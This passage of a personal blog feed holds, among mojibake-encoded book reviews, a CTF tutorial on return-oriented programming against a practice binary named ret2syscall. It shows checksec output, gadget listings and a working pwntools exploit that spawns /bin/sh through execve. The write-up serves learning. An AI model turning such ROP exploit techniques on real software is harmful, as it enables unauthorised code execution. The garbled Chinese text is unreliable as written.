è‘›ã€‚å°è¯´æ‰¹åˆ¤äº†å®˜æœ¬ä½æ–‡åŒ–çš„å¨åŠ›åŠæƒåŠ›å´‡æ‹œçš„å±å®³ï¼Œæ­ç©¿äº†è™šå¹»çš„çœŸå®ï¼Œè¶…å‡ºäº†ä¸€èˆ¬å®˜åœºå°è¯´çš„æ ¼å±€ã€‚</p><p>è¿˜å¯ä»¥ï¼ŒæŒºå¥½æŒºçœŸå®çš„ä¸€æœ¬å®˜åœºå°è¯´ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;é•¿å®‰çš„è”æ&quot;&gt;&lt;a href=&quot;#é•¿å®‰çš„è”æ&quot; class=&quot;headerlink&quot; title=&quot;é•¿å®‰çš„è”æ&quot;&gt;&lt;/a&gt;é•¿å®‰çš„è”æ&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2023/02/27/è¯»ä¹¦åˆ†äº«III/1.png&quot; alt=&quot;1&quot; style=&quot;zoom:5
      
    
    </summary>
    
    
      <category term="éšç¬”" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>ROPå­¦ä¹ </title>
    <link href="elssm.github.io/2022/12/29/ROP%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2022/12/29/ROPå­¦ä¹ /</id>
    <published>2022-12-29T10:37:21.000Z</published>
    <updated>2022-12-30T04:18:31.235Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>é€šè¿‡ä¸€é“PWNé¢˜ç›®å­¦ä¹ ROPã€‚</p><p>éšç€ NX ä¿æŠ¤ (No-eXecute ä¸å¯æ‰§è¡Œ) çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP (Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p>ROPgadgetå·¥å…·å¯ä»¥å¸®åŠ©ä½ å¯»æ‰¾åˆé€‚çš„gadgetsï¼Œåœ¨ç¼–å†™ä½ çš„<code>ROP exp</code>çš„æ—¶å€™æœ‰å¾ˆå¤§ä½œç”¨ã€‚ROPgadgetæ”¯æŒx86, x64, ARM, ARM64, PowerPC, SPARCå’ŒMIPSæ¶æ„ä¸‹çš„ELF/PE/Mach-Oæ–‡ä»¶æ ¼å¼ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ„é€ çš„gadgetå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,["/bin/sh"]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line">int 0x80</span><br><span class="line">==&gt; execve("/bin/sh",NULL,NULL)</span><br></pre></td></tr></table></figure><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>checksecæŸ¥çœ‹å¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % checksec ret2syscall</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æ¶æ„å¾—ä¹‹ä¸»è¦çš„å¯„å­˜å™¨æœ‰<code>eax ebp ebx ecx..</code></p><p>ç¨‹åºæ‰§è¡Œå¦‚ä¸‹ï¼Œè¾“å‡ºå‰ä¸¤å¥åæ¥å—è¾“å…¥ï¼Œç„¶åé€€å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# ./ret2syscall</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘æŸ¥çœ‹ï¼Œä»getså‡½æ•°å¾—ä¹‹å­˜åœ¨æº¢å‡ºæ¼æ´</p><p><img src="/2022/12/29/ROPå­¦ä¹ /1.png" alt="1"></p><p><code>pwndbg</code>æŸ¥çœ‹å¯„å­˜å™¨ä½ç½®ï¼Œå‘ç°eaxå¯„å­˜å™¨ä½ç½®ä¸º<code>0xffffd29c</code>ï¼Œ<code>ebp</code>å¯„å­˜å™¨çš„ä½ç½®ä¸º<code>0xffffd308</code>ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¦†ç›–æ‰<code>ebp</code>å¯„å­˜å™¨çš„ä½ç½®ï¼Œåˆ™éœ€è¦å¡«å……çš„å­—èŠ‚ä¸º<code>0xffffd308-0xffffd29c</code>å­—èŠ‚å†åŠ ä¸Š<code>ebp</code>æ‰€å çš„4ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæ¶æ„æ˜¯32ä½çš„ã€‚å³éœ€è¦å¡«å……112å­—èŠ‚ã€‚</p><p><img src="/2022/12/29/ROPå­¦ä¹ /2.png" alt="2"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>æ¥ç€æˆ‘ä»¬é€šè¿‡<code>ROPgadget</code>å·¥å…·å¯»æ‰¾<code>gadget</code></p><p>é¦–å…ˆå¯»æ‰¾eaxçš„<code>pop|ret</code>åœ°å€ï¼Œé€‰æ‹©<code>0x080bb196</code>åœ°å€æœ€åˆé€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep eax</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>æ¥ç€å¯»æ‰¾ebxçš„<code>pop|ret</code>åœ°å€ï¼Œæœ‰å¾ˆå¤šï¼Œå“ªä¸€ä¸ªæœ€é€‚åˆå‘¢ï¼Œå‘ç°<code>0x0806eb90</code>æœ€åˆé€‚ï¼Œå› ä¸ºå®ƒä¹Ÿæœ‰<code>ecx</code>å’Œ<code>edx</code>å¯„å­˜å™¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬å¯»æ‰¾<code>int</code>ï¼Œåœ°å€ä¸º<code>0x08049421</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "int"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p>å› ä¸ºebpå¯„å­˜å™¨ä¸­éœ€è¦å†™å…¥<code>/bin/sh</code>ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°<code>/bin/sh</code>çš„åœ°å€</p><p>åœ¨<code>ghidra</code>ä¸­å…¨å±€æœç´¢å‘ç°åœ°å€ä¸º<code>0x80be408</code></p><p><img src="/2022/12/29/ROPå­¦ä¹ /3.png" alt="3"></p><p>æˆ–è€…é€šè¿‡pythonç¼–å†™è„šæœ¬è·å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2syscall'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.search(<span class="string">b'/bin/sh'</span>)</span><br><span class="line">&lt;generator object ELF.search at <span class="number">0x7f024f030db0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="string">'0x80be408'</span></span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>ç¼–å†™<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_80h = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*<span class="number">112</span>, pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>æœ¬åœ°æ‰§è¡Œ<code>exp</code>è·å–<code>shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# python3 exp.py</span><br><span class="line">[+] Starting local process './ret2syscall': pid 3300219</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line"><span class="meta">$</span> ls</span><br><span class="line">exp.py       ret2libc2  ret2shellcode  ret2text</span><br><span class="line">ret2libc1  ret2libc3  ret2syscall    tools</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;é€šè¿‡ä¸€é“PWNé¢˜ç›®å­¦ä¹ ROPã€‚&lt;/p&gt;
&lt;p&gt;éšç€ NX ä¿æŠ¤ (No-eXecute ä¸å¯æ‰§è¡Œ) çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç 
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>è¯»ä¹¦åˆ†äº«II</title>
    <link href="elssm.github.io/2022/12/15/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABII/"/>
    <id>elssm.github.io/2022/12/15/è¯»ä¹¦åˆ†äº«II/</id>
    <published>2022-12-15T14:13:03.000Z</published>
    <updated>2023-02-27T13:40:52.746Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æœèŠ±å¤•æ‹¾"><a href="#æœèŠ±å¤•æ‹¾" class="headerlink" title="æœèŠ±å¤•æ‹¾"></a>æœèŠ±å¤•æ‹¾</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/1.jpeg" alt="1" style="zoom:50%;"></p><p><strong>æˆ‘å¸¸æƒ³åœ¨çº·æ‰°ä¸­å¯»å‡ºä¸€ç‚¹é—²é™æ¥ï¼Œç„¶è€Œå§”å®ä¸å®¹æ˜“ã€‚ç›®å‰æ˜¯è¿™ä¹ˆç¦»å¥‡ï¼Œå¿ƒé‡Œæ˜¯è¿™ä¹ˆèŠœæ‚ã€‚ä¸€ä¸ªäººåšåˆ°åªå‰©äº†å›å¿†çš„æ—¶å€™ï¼Œç”Ÿæ¶¯å¤§æ¦‚æ€»è¦ç®—æ˜¯æ— èŠäº†ç½¢ï¼Œä½†æœ‰æ—¶ç«Ÿä¼šè¿å›å¿†ä¹Ÿæ²¡æœ‰ã€‚</strong></p><p>ã€ŠæœèŠ±å¤•æ‹¾ã€‹é‡Œé²è¿…ç”¨å¤¹å™å¤¹è®®çš„æ–¹æ³•ï¼Œä»¥é’å°‘å¹´æ—¶ä»£çš„ç”Ÿæ´»ç»å†ä¸ºçº¿ç´¢ï¼ŒçœŸå®ç”ŸåŠ¨åœ°å™å†™äº†è‡ªå·±ä»å†œæ‘åˆ°åŸé•‡ï¼Œä»å®¶åº­åˆ°ç¤¾ä¼šï¼Œä»å›½å†…åˆ°å›½å¤–çš„ä¸€ç»„ç”Ÿæ´»ç»å†ï¼ŒæŠ’å‘äº†å¯¹å¾€æ˜”äº²å‹å’Œå¸ˆé•¿çš„æ€€å¿µä¹‹æƒ…ï¼ŒåŒæ—¶ä¹Ÿå¯¹æ—§åŠ¿åŠ›ã€æ—§æ–‡åŒ–è¿›è¡Œäº†å˜²è®½å’ŒæŠ¨å‡»ã€‚</p><p>æœèŠ±å¤•æ‹¾ï¼Œæ¸…æ—©è½ä¸‹çš„èŠ±æœµåˆ°äº†å‚æ™šæ‹¾èµ·æ¥ã€‚å¹³é™åœ°å¼¯è…°ï¼Œå‡è§†ï¼Œå›å¿†ï¼Œæ¡èµ·ã€‚è¿™ä¸ªåŸæœ¬ç®€å•å¹³å’Œçš„è¿‡ç¨‹è¢«é²è¿…å…ˆç”Ÿèµ‹äºˆäº†æ–°çš„å«ä¹‰ã€‚åˆé«˜ä¸­ä¸å–œæ¬¢è¯­æ–‡è¯¾ï¼Œç°åœ¨è¯»èµ·ç«Ÿåˆ«æœ‰ä¸€ç•ªæ»‹å‘³ã€‚å­©ç«¥æ—¶æœŸé²è¿…å¯¹çŒ«çš„è®¨åŒã€å¯¹äºŒåå››å­å›¾çš„ææƒ§ã€å¯¹ç™¾è‰å›­çš„å–œçˆ±ã€å¯¹é•¿å¦ˆå¦ˆçš„å¤æ‚æ„Ÿæƒ…ï¼›é•¿å¤§ä¹‹åå¯¹è—¤é‡å…ˆç”Ÿçš„å°Šæ•¬ã€å¯¹èŒƒçˆ±å†œçš„æ€œæ‚¯ã€‚ä»–çš„æ•¬æ„å’Œæ„Ÿæ¿€ï¼Œä»æ¯ä¸€å¥è¯é‡Œæµéœ²å‡ºæ¥ï¼Œç»†èŠ‚æ˜¯é‚£æ ·æ¸…æ™°ï¼Œäººç‰©ä»å›å¿†é‡Œèµ°å‡ºæ¥ï¼Œä»çº¸ä¸Šç«–ç«‹èµ·æ¥ï¼Œå˜å¾—æœ‰è¡€æœ‰è‚‰ï¼Œè¢’éœ²ç€çœŸå®æ€§æƒ…ã€‚</p><h4 id="å¤œè°­åè®°"><a href="#å¤œè°­åè®°" class="headerlink" title="å¤œè°­åè®°"></a>å¤œè°­åè®°</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/2.png" alt="2" style="zoom:50%;"></p><p><strong>å‡¡æ˜¯ä»–ä»¬å«åšâ€œè‡ªç”±â€çš„ä¸œè¥¿ï¼Œå°±æ˜¯ä¸è‡ªç”±çš„é™·é˜±</strong></p><p>ã€Šå¤œè°­åè®°ã€‹æ˜¯è‘—åä½œå®¶é©¬è¯†é€”çš„ä»£è¡¨ä½œã€‚å†…å®¹ä¸ºä¸Šä¸–çºªå››åå¹´ä»£å››å·æŸåœ°è¡™é—¨ï¼Œåä¸ªä»•é€”å¤±æ„åˆç©·ææ— èŠçš„å°ç§‘å‘˜ä»¥æ‘†â€œé¾™é—¨é˜µâ€çš„æ–¹å¼ï¼Œè½®æµè®²è¿°è‡ªå·±ç»å†çš„ç§ç§å¥‡é‡ã€‚æœ¬ä¹¦å› å…¶ä¸­çš„ã€Šç›—å®˜è®°ã€‹è¢«æ”¹ç¼–ä¸ºç”µå½±ã€Šè®©å­å¼¹é£ã€‹è€Œå¹¿ä¸ºäººçŸ¥ã€‚</p><p>è¿™æœ¬ä¹¦ä»1942å¹´æœ€åˆå¼€å§‹å†™åˆ°1982å¹´æœ€ç»ˆæˆä¹¦ï¼Œç»å†äº†40å¹´çš„æ—¶é—´ï¼Œæˆ‘åœ¨2022å¹´æœ‰å¹¸è¯»åˆ°è¿™æœ¬ä¹¦ã€‚æœ€åˆå› ä¸ºã€Šè®©å­å¼¹é£ã€‹çš„ç¼˜æ•…æˆ‘æƒ³è¯»è¿™æœ¬ä¹¦ï¼Œæœ€åå‘ç°ä¹¦ä¸­çš„å…¶ä»–æ•…äº‹ä¸ªä¸ªç²¾å½©ã€‚ç ´åŸè®°çš„åè½¬ã€æŠ¥é”€è®°çš„æƒŠé™©ã€ç›—å®˜è®°çš„æ­£ä¹‰ã€æ²‰æ²³è®°çš„æ‚²æƒ¨ç­‰ç­‰ï¼Œæ¯ä¸€ä¸ªæ•…äº‹éƒ½ä»¤äººæ·±æ€ï¼Œæ„Ÿè°¢ä½œè€…ã€‚ä½œè€…åœ¨åè®°è¿˜å†™é“ç”±äºæˆä¹¦æ—¶é—´å¤ªé•¿ï¼Œè¿™äº›æ•…äº‹ä¸çŸ¥é“è¿˜é€‚ä¸é€‚åˆå½“ä¸‹é˜…è¯»ï¼Œè¿™å½“ç„¶ä¹Ÿå¯èƒ½æ˜¯ä½œè€…è‡ªè°¦çš„è¯´æ³•å“ˆå“ˆå“ˆå“ˆã€‚åæ­£æˆ‘æ˜¯å¾ˆæ¨èè¿™æœ¬ä¹¦çš„ï¼ï¼ï¼å½“ä»Šç”Ÿæ´»è¢«å„ç§ç”µå­äº§å“å……æ–¥ï¼Œä»¥åæœ‰æœºä¼šçš„è¯ä¹Ÿè¦æä¸€ä¸ªå†·æ¿å‡³ä¼š</p><h4 id="ä¸€å¥é¡¶ä¸€ä¸‡å¥"><a href="#ä¸€å¥é¡¶ä¸€ä¸‡å¥" class="headerlink" title="ä¸€å¥é¡¶ä¸€ä¸‡å¥"></a>ä¸€å¥é¡¶ä¸€ä¸‡å¥</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/6.jpeg" alt="6" style="zoom:50%;"></p><p><strong>æ—¥å­æ˜¯è¿‡ä»¥åï¼Œä¸æ˜¯è¿‡ä»å‰ã€‚</strong></p><p>æœ¬ä¹¦æ˜¯åˆ˜éœ‡äº‘é…é…¿åˆ›ä½œäº†ä¸‰å¹´çš„å°è¯´ã€‚ä¹Ÿæ˜¯ä»–è¿„ä»Šæœ€æˆç†Ÿæœ€å¤§æ°”çš„ä½œå“ã€‚å°è¯´çš„å™äº‹é£æ ¼ç±»ä¼¼æ˜æ¸…çš„é‡ç¨—æ—¥è®°,è¯­å¥æ´—ç»ƒ,æƒ…èŠ‚ç®€æ´,å™äº‹ç›´æ¥,æœ‰æ±ªæ›¾ç¥ºå’Œå­™çŠç­‰å‰è¾ˆä½œå®¶é—é£ã€‚å› è€Œæœ¬ä¹¦çš„æ¯ä¸€ä¸ªå­—æ¯ä¸€å¥è¯,éƒ½æ„æˆè¨€è¯´çš„è‰ºæœ¯,éƒ½èƒ½æ‹§å‡ºä½œå®¶çš„æ±—æ°´ã€‚æ›´ä¸ºé‡è¦çš„æ˜¯,ä½œå®¶å”¯æœ‰ç”¨æ­¤è¯­è¨€,æ‰æœ‰å¯¹åº”å’Œè¡¨ç°ä½œå“çš„å†…æ¶µã€‚</p><p>é˜³çš„å‰ä¸¤å¤©ï¼Œä¸€å£æ°”è¯»å®Œäº†è¿™æœ¬ä¹¦ã€‚ä¹¦ä¸­åˆ†ä¸ºå‡ºå»¶æ´¥å’Œå›å»¶æ´¥ä¸Šä¸‹ä¸¤éƒ¨å™è¿°ï¼Œæ—¶é—´è·¨åº¦æŒºé•¿ï¼Œæœ‰å››ä»£äººå·®ä¸å¤šã€‚å‰åŠéƒ¨åˆ†æ¨ç™¾é¡ºï¼ŒååŠéƒ¨åˆ†ç‰›çˆ±å›½ã€‚äººç‰©ç»“æ„æŒºå¤æ‚ï¼Œä½†æ˜¯æ¯ä¸€ä¸ªäººç‰©åˆ»ç”»çš„éƒ½å¾ˆæ·±åˆ»ã€‚æˆ‘åˆšå¼€å§‹ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¹¦åå«è¿™ä¸ªï¼Œå½“æˆ‘è¯»åˆ°å°éŸ©è¢«è§†å¯Ÿçš„æ—¶å€™ã€è¯»åˆ°è€é©¬ç»™è€æ¨å‡ºä¸»æ„çš„æ—¶å€™ã€è¯»åˆ°è€è©¹ç»™æ‘©è¥¿è§£æƒ‘çš„æ—¶å€™ã€‚æˆ–è®¸æ˜ç™½äº†ä»€ä¹ˆå«ä¸€å¥é¡¶ä¸€ä¸‡å¥â€¦.</p><h4 id="ç­šè·¯ç»´è‰°ï¼šä¸­å›½ç¤¾ä¼šä¸»ä¹‰è·¯å¾„çš„äº”æ¬¡é€‰æ‹©"><a href="#ç­šè·¯ç»´è‰°ï¼šä¸­å›½ç¤¾ä¼šä¸»ä¹‰è·¯å¾„çš„äº”æ¬¡é€‰æ‹©" class="headerlink" title="ç­šè·¯ç»´è‰°ï¼šä¸­å›½ç¤¾ä¼šä¸»ä¹‰è·¯å¾„çš„äº”æ¬¡é€‰æ‹©"></a>ç­šè·¯ç»´è‰°ï¼šä¸­å›½ç¤¾ä¼šä¸»ä¹‰è·¯å¾„çš„äº”æ¬¡é€‰æ‹©</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/7.jpeg" alt="7" style="zoom:50%;"></p><p><strong>çœŸæ­£çš„å±é™©ä¸åœ¨å› ç¼ºä¹ç»éªŒè€ŒçŠ¯é”™ï¼Œè€Œåœ¨äºå› é˜»å¡æ‰¹è¯„è€Œä¸§å¤±çº é”™çš„èƒ½åŠ›ã€‚</strong></p><p>æœ¬ä¹¦ä»¥ç®€æ˜æ¸…æ™°çš„æ–‡å­—å¯¹å½“ä»£ä¸­å›½çš„å†å²è½¨è¿¹åšäº†é€»è¾‘æ¢³ç†ã€‚ä½œè€…è®¤ä¸ºï¼Œä»æ‰§æ”¿å…šçš„å»ºå›½æ–¹ç•¥ã€å‘å±•æ¨¡å¼å’ŒåŸºæœ¬æ”¿ç­–è§’åº¦è€ƒå¯Ÿï¼Œä¸­å›½ç¤¾ä¼šä¸»ä¹‰çš„å®è·µè·¯å¾„ç»å†äº†ä»å®è¡Œæ–°æ°‘ä¸»ä¸»ä¹‰å¼€å§‹ï¼Œé€”ç»ä»¿æ•ˆè‹è”æ¨¡å¼ã€è¿½å¯»èµ¶è¶…ä¹‹è·¯ã€å‘åŠ¨ç»§ç»­é©å‘½å’Œå®è¡Œæ”¹é©å¼€æ”¾çš„äº”æ¬¡å†å²é€‰æ‹©ã€‚</p><p>æˆ‘ä»¬åº”è¯¥æ›´æ¸…æ™°çš„äº†è§£å†å²ã€‚</p><h4 id="ç½®èº«äº‹å†…ï¼šä¸­å›½æ”¿åºœä¸ç»æµå‘å±•"><a href="#ç½®èº«äº‹å†…ï¼šä¸­å›½æ”¿åºœä¸ç»æµå‘å±•" class="headerlink" title="ç½®èº«äº‹å†…ï¼šä¸­å›½æ”¿åºœä¸ç»æµå‘å±•"></a>ç½®èº«äº‹å†…ï¼šä¸­å›½æ”¿åºœä¸ç»æµå‘å±•</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/8.png" alt="8" style="zoom:50%;"></p><p>ã€Šç½®èº«äº‹å†…ï¼šä¸­å›½æ”¿åºœä¸ç»æµå‘å±•ã€‹æ˜¯å¤æ—¦å¤§å­¦ç»æµå­¦é™¢å‰¯æ•™æˆå…°å°æ¬¢å¤šå¹´æ•™å­¦ä¸ç 